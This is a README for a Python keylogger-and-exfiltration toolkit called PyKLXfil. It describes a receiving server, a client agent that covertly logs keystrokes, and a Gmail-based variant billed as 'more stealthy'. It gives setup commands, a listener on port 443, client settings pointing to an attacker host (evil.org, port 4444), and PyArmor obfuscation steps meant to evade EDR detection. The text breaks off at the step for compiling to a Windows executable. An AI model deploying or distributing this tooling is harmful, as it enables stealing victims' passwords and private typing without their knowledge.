# PyKLXfil: Python Keylogger and Exfiltrator.
## The toolset contains four main tools:
* PyKLXfil-Server: a socket server to recieve the exfiltrated data from a victem.
* PyKLXfil-Client: the agent that will perform the encoded key logging with a custome base64 table and the exfiltration of data back to PyKLXfil-Server.
* PyKLXfil-Client-mail: a standalone agent that will perform encoded key logging with a custome base64 table and exfiltration to a gmail email account (more stealthy).
* PyKLXfil-Decoder: a tool to decode the key logs.
## Install:
```sh
  git clone https://github.com/iD4rksid3/PyKLXfil.git
  cd PyKLXfil
  #The tool requires only two external modules: yagmail and pynput
  pip3 install -r requirements.txt
  ```
## Usage:
* Key logging and exfiltration using socket server and client:
```sh
#start listening on all NICs and on port 443 as background job
python3 PyKLXfil-Server.py 0.0.0.0 443 &
```
* Compile and obfuscate the python client for a windows machine:
```sh
#Edit PyKLXfil-Client.py and add your server's IP/domain and port
 nano PyKLXfil-Client.py
 #snip...       
 #self.host = 'evil.org'
 #self.port = 4444
 ```
 * Optionally you can obfuscate the script with PyArmore to make it less detectable by EDRs:
 ```sh
 pip3 install pyarmor
 pyarmor obfuscate PyKLXfil-Client.py
 ```
 * Compile the script to exe using pyinstaller:
